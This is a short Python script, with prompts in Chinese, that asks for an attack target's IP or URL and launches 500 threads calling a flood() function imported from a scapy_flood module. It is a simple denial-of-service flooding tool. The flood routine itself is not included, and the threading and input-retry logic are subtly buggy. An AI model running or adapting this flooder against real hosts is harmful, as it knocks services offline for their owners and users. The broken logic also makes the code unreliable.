import threading

from getip import get_ip

import re

from scapy_flood import flood


def input_ip():
    ip = input('攻击地址的IP或URL：')
    if re.match((r'(^http)s?://'), ip):
        ip = get_ip(ip)

        if not ip:
            print('格式错误！')
            input_ip()

    elif not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        print('格式错误！')
        input_ip()

    return ip


if __name__ == '__main__':
    d_ip = input_ip()
    for i in range(500):
        t = threading.Thread(target=flood(d_ip)).start()
